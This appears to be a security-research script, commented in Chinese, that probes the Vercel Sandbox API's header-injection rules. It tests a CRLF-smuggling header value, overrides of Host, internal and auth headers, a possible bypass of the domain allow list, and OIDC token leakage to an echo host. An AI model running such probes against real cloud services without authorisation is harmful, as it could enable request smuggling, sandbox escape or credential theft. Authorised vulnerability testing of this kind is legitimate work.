# -*- coding: utf-8 -*-
"""非传统面L2: injectionRules 头注入原语深挖
① CRLF 注入 (header value 含 \r\n → 请求走私/响应拆分?)
② 敏感头注入: Host / Authorization / x-vercel-* / X-Forwarded-*
③ OIDC 组合: custom 模式下访问 vercel.app 项目是否自动带 x-vercel-oidc-token
④ injectionRules.domain 与 allowedDomains 解耦 (隐式允许面?)
⑤ Host 覆盖 + 上游路由 (H 线组合)
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s): print(s, flush=True)

def parse_data(r):
    out = ''
    for line in (r or '').splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

ECHO = 'sbx-echo-e29ca9cb.vercel.app'

# ===== ① CRLF + 敏感头注入 (echo 项目回显验证) =====
log('===== ① CRLF/敏感头注入 =====')
api("DELETE", "/v2/sandboxes/l31?teamId=%s&projectId=%s" % (TEAM, PROJ))
time.sleep(2)
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {
    "projectId": PROJ, "name": "l31",
    "networkPolicy": {"mode": "custom", "allowedDomains": [ECHO],
                      "injectionRules": [
                          {"domain": ECHO, "headers": {
                              "X-Fwd": "1.2.3.4",
                              "X-Vercel-Internal": "yes",
                              "Host": "vercel.com",
                              "X-CRLF": "a\r\nX-Injected: b",
                              "X-Auth": "Bearer fake",
                          }}
                      ]}
}, 60)
log('create -> %s | %s' % (c, (r or '')[:250].replace(chr(10), ' ')))
if c == 200:
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(3)
    # guest 访问 echo 项目
    c3, r3 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
                 {"command": "sh", "args": ["-c",
                  "curl -s -m 10 https://%s/ 2>&1 | head -60" % ECHO],
                  "wait": True, "timeout": 18000, "logs": True}, 35)
    out = parse_data(r3)
    log('echo resp: %s' % out[:1200].replace(chr(10), ' '))
    api("DELETE", "/v2/sandboxes/l31?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(1)

# ===== ② injectionRules 独立 domain (隐式允许面) =====
log('')
log('===== ② injectionRules 独立 domain =====')
api("DELETE", "/v2/sandboxes/l31b?teamId=%s&projectId=%s" % (TEAM, PROJ))
time.sleep(2)
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {
    "projectId": PROJ, "name": "l31b",
    "networkPolicy": {"mode": "custom",
                      "allowedDomains": [],
                      "injectionRules": [{"domain": ECHO, "headers": {"X-Only": "1"}}]},
}, 60)
log('create (empty allow + inj) -> %s | %s' % (c, (r or '')[:250].replace(chr(10), ' ')))
if c == 200:
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(3)
    for url in ['https://%s/' % ECHO, 'https://httpbin.org/anything']:
        c3, r3 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
                     {"command": "sh", "args": ["-c", "curl -s -m 8 %s 2>&1 | head -20" % url],
                      "wait": True, "timeout": 15000, "logs": True}, 30)
        out = parse_data(r3)
        log('[%s] -> %s' % (url, out[:400].replace(chr(10), ' ')))
    api("DELETE", "/v2/sandboxes/l31b?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(1)

# ===== ③ OIDC 自动注入 (custom 模式) =====
log('')
log('===== ③ OIDC custom 模式 =====')
api("DELETE", "/v2/sandboxes/l31c?teamId=%s&projectId=%s" % (TEAM, PROJ))
time.sleep(2)
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {
    "projectId": PROJ, "name": "l31c",
    "networkPolicy": {"mode": "custom", "allowedDomains": [ECHO]},
}, 60)
if c == 200:
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(3)
    c3, r3 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
                 {"command": "sh", "args": ["-c",
                  "curl -s -m 10 https://%s/ 2>&1 | head -40" % ECHO],
                  "wait": True, "timeout": 18000, "logs": True}, 35)
    log('oidc echo resp: %s' % parse_data(r3)[:800].replace(chr(10), ' '))
    api("DELETE", "/v2/sandboxes/l31c?teamId=%s&projectId=%s" % (TEAM, PROJ))

log('DONE')
